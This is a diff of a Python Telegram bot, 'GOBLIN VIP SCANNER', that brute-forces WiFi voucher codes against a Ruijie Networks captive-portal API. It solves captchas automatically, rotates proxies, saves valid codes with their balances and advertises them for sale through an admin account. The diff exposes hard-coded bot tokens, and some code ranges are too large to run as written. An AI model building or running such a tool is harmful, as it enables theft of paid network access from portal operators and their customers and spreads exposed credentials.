@@ -27,9 +27,12 @@ MAX_CONCURRENT = 200
 CONNECTION_LIMIT = 200
 ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
-TOKEN = "8792599284:AAGUwV6DWXcelkbHa9uGoRgyb00B5scN_XI"
+TOKEN = "8780431275:AAF8-qGOEdzySJQL51yvrV387GoYgo_72ss"
 
-PROXY_LIST = []
+# Proxy List
+PROXY_LIST = [
+    # "http://123.45.67.89:8080",
+]
 proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
 
 # ── DATABASE SETUP ────────────────────────────────────────────────────────
@@ -153,23 +156,23 @@ def code_generator(mode):
         codes = [str(i).zfill(9) for i in range(1000000000)]
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(500000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(3000000000000000)]
     else:
-        codes = [str(i).zfill(6) for i in range(1000000)]
+        codes = [str(i).zfill(6) for i in range(10000000000000000000)]
 
     random.shuffle(codes)
     for code in codes:
         yield code
 
-async def perform_check_silent(code, chat_obj, user_id, session_url, connector, context_data):
+async def perform_check_silent(code, chat_obj, session_url, connector, context_data):
     if context_data.get('scan_stop', False): return None
     context_data['current_code'] = code
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
     session_id = None
-    timeout = aiohttp.ClientTimeout(total=8, connect=2)
+    timeout = aiohttp.ClientTimeout(total=10, connect=3)
     
     proxy = next(proxy_pool) if proxy_pool else None
 
@@ -180,58 +183,45 @@ async def perform_check_silent(code, chat_obj, user_id, session_url, connector, 
                 if not session_id:
                     session_id = await get_session_id(task_session, session_url, proxy=proxy)
                     if not session_id:
-                        context_data['failed'] += 1; return None
+                        context_data['expired'] += 1; return None
 
                 image = await Captcha_Image(task_session, session_id, proxy=proxy)
                 if not image:
-                    context_data['failed'] += 1; return None
+                    context_data['expired'] += 1; return None
                 text = await Captcha_Text(image)
                 if not text or not await Varify_Captcha(task_session, session_id, text, proxy=proxy):
-                    context_data['failed'] += 1; return None
+                    context_data['expired'] += 1; return None
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
+                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=8) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(0.3); continue
+                        context_data['retry_total'] += 1; await asyncio.sleep(0.5); continue
                     if 'logonUrl' in response or '"success":true' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
                             balance_display, plan_name = balance_info
-                            context_data['success_codes'].append({"code": code, "plan": plan_name, "balance": balance_display})
-                            context_data['hits'] += 1
+                            if not any(item['code'] == code for item in context_data['success_codes']):
+                                context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
+                                context_data['hits'] += 1
 
-                            async with db_lock:
-                                cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
-                                conn.commit()
-
-                            # Hit တစ်ခုတွေ့တိုင်း ချက်ချင်း Live တင်ပြပေးမည့် စာသားပုံစံ
-                            success_list = context_data['success_codes']
-                            live_report = "💯 **Hit Codes:**\n"
-                            for item in success_list:
-                                live_report += f"`{item['code']}` 🎫 : {item['balance']}\n"
-                            live_report += f"\n🛒 **ဝယ်ယူရန်:** [Admin @gobiln07]({ADMIN_URL})"
-
-                            # မူလ Status Message ကို ချက်ချင်း Edit ၍ Hit စာရင်း အပ်ဒိတ်လုပ်ရန်
-                            status_msg = context_data.get('status_msg')
-                            if status_msg:
-                                try:
-                                    await status_msg.edit_text(live_report, parse_mode="Markdown", disable_web_page_preview=True)
-                                except:
-                                    pass
+                                user_id = chat_obj.id
+                                async with db_lock:
+                                    cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
+                                    conn.commit()
                             return True
-                    context_data['failed'] += 1; return None
+                    context_data['expired'] += 1; return None
         except:
-            context_data['failed'] += 1; return None
-    context_data['failed'] += 1
+            context_data['expired'] += 1; return None
+    context_data['expired'] += 1
     return None
 
 async def run_scanner_background(query, session_url, mode, total_codes_count, context):
     context.user_data['scan_stop'] = False
     context.user_data['checked_total'] = 0
     context.user_data['hits'] = 0
-    context.user_data['failed'] = 0
+    context.user_data['expired'] = 0
     context.user_data['retry_total'] = 0
     context.user_data['success_codes'] = []
     context.user_data['current_code'] = "000000"
@@ -240,14 +230,11 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
     last_edit_time = 0
     connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, ttl_dns_cache=300)
     code_gen = code_generator(mode)
-    user_id = query.from_user.id
 
     try:
-        status_msg = await query.message.reply_text(f"🚀 **Goblin Code Scanner Started** (Mode: {mode})...")
+        status_msg = await query.message.reply_text(f"🚀 စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
     except:
-        status_msg = await query.message.chat.send_message(f"🚀 **Goblin Code Scanner Started** (Mode: {mode})...")
-    
-    context.user_data['status_msg'] = status_msg
+        status_msg = await query.message.chat.send_message(f"🚀 စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
 
     try:
         while not context.user_data.get('scan_stop', False):
@@ -256,7 +243,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
                 if context.user_data.get('scan_stop', False): break
                 try:
                     code = next(code_gen)
-                    tasks.append(perform_check_silent(code, query.message.chat, user_id, session_url, connector, context.user_data))
+                    tasks.append(perform_check_silent(code, query.message.chat, session_url, connector, context.user_data))
                     context.user_data['checked_total'] += 1
                 except StopIteration:
                     context.user_data['scan_stop'] = True
@@ -267,58 +254,55 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             await asyncio.sleep(0.01)
             if context.user_data.get('scan_stop', False): break
 
+            # Telegram Rate Limit မမိစေရန် ၁ စက္ကန့်မှ တစ်ကြိမ်သာ edit_text လုပ်မည်
             current_time = time.time()
-            if current_time - last_edit_time < 1.5:
+            if current_time - last_edit_time < 1.0:
                 continue
             last_edit_time = current_time
 
-            # Hit တစ်ခုမှ မတွေ့ရသေးလျှင် Speed နှင့် Progress ကို ပြသနေမည် (Hit တွေ့သွားပါက အပေါ်ကအတိုင်း Hit စာရင်းပြောင်းသွားမည်)
-            if context.user_data.get('hits', 0) == 0:
-                checked_total = context.user_data.get('checked_total', 0)
-                failed = context.user_data.get('failed', 0)
-                current_code = context.user_data.get('current_code', '000000')
+            checked_total = context.user_data.get('checked_total', 0)
+            hits = context.user_data.get('hits', 0)
+            expired = context.user_data.get('expired', 0)
+            current_code = context.user_data.get('current_code', '000000')
 
-                elapsed_time = current_time - start_time
-                speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
+            elapsed_time = current_time - start_time
+            speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
 
-                text = (
-                    f"⚡ **GOBLIN VIP SCANNER** ⚡\n"
-                    f"━━━━━━━━━━━━━━━━━━━\n"
-                    f"🔍 **Status:** Running...\n"
-                    f"📦 **Checked:** `{checked_total:,}` codes\n"
-                    f"🔑 **Current:** `{current_code}`\n"
-                    f"🎯 **Hits Found:** `0`\n"
-                    f"❌ **Invalid/Failed:** `{failed:,}`\n"
-                    f"🚀 **Speed:** `{speed_cm:.1f} c/m`\n"
-                    f"━━━━━━━━━━━━━━━━━━━"
-                )
-                try:
-                    await status_msg.edit_text(text, parse_mode="Markdown")
-                except: pass
+            recent_hits = context.user_data.get('success_codes', [])[:25]
+            hits_text = ""
+            if recent_hits:
+                hits_text = "\n\n💯 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
+
+            text = (
+                f"⚡ **GOBLIN VIP SCANNER** ⚡\n"
+                f"━━━━━━━━━━━━━━━━━━━\n"
+                f"🔍 Status: Running...\n"
+                f"📦 Checked: {checked_total:,} codes\n"
+                f"🔑 Current: `{current_code}`\n"
+                f"🎯 Hits Found: {hits}\n"
+                f"❌ Invalid/Failed: {expired:,}\n"
+                f"🚀 Speed: {speed_cm:.1f} c/m\n"
+                f"━━━━━━━━━━━━━━━━━━━"
+                f"{hits_text}"
+            )
+            try:
+                await status_msg.edit_text(text, parse_mode="Markdown")
+            except: 
+                pass
 
     except Exception as e:
         print(e)
     finally:
         try: await connector.close()
         except: pass
-        
         hits_count = context.user_data.get('hits', 0)
-        success_list = context.user_data.get('success_codes', [])
+        checked_count = context.user_data.get('checked_total', 0)
+        try:
+            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ。\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
+        except:
+            pass
 
-        if hits_count > 0:
-            final_text = "💯 **Hit Codes:**\n"
-            for item in success_list:
-                final_text += f"`{item['code']}` 🎫 : {item['balance']}\n"
-            final_text += f"\n🛒 **ဝယ်ယူရန်:** [Admin @gobiln07]({ADMIN_URL})"
-            try:
-                await query.message.chat.send_message(final_text, parse_mode="Markdown", disable_web_page_preview=True)
-            except: pass
-        else:
-            try:
-                await query.message.chat.send_message("❌ **စကန်ဖတ်ခြင်း ပြီးဆုံးပါပြီ။** ဤအကြိမ်တွင် Hit Codes မတွေ့ရှိပါ။", parse_mode="Markdown")
-            except: pass
-
-# ── TELEGRAM HANDLERS ────────────────────────────────────────────────     
+# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -399,7 +383,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             conn.commit()
 
         context.user_data['waiting_for_code'] = False
-        await message.reply_text(f"✅ **Access Granted!** သက်တမ်း ({duration_type}) ဖြင့် အောင်မြင်စွာ စတင်အသုံးပြုနိုင်ပါပြီ။")
+        await message.reply_text(f"✅ **Access Granted!** သက်တမ်း ({duration_type}) ဖြင့် အောင်မြင်စွာ စတင်အသုံးပြုနိုင်ပါပြီ。")
         await start(update, context)
         return
 
@@ -504,16 +488,15 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    result_text = "💯 **Hit Codes:**\n"
-    for item in rows:
-        result_text += f"`{item[0]}` 🎫 : {item[2]}\n"
-    result_text += f"\n🛒 **ဝယ်ယူရန်:** [Admin @gobiln07]({ADMIN_URL})"
+    result_text = f"💎 **Saved Codes (Latest {len(rows)})**\n\n"
+    for idx, item in enumerate(rows, 1):
+        result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"
 
     if query:
-        await query.message.reply_text(result_text, parse_mode="Markdown", disable_web_page_preview=True)
+        await query.message.reply_text(result_text, parse_mode="Markdown")
         await query.answer()
     else:
-        await update.message.reply_text(result_text, parse_mode="Markdown", disable_web_page_preview=True)
+        await update.message.reply_text(result_text, parse_mode="Markdown")
 
 async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -525,7 +508,7 @@ async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['scan_stop'] = True
-    await update.message.reply_text("🛑 **စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။**", parse_mode="Markdown")
+    await update.message.reply_text("🛑 **စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ。**", parse_mode="Markdown")
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
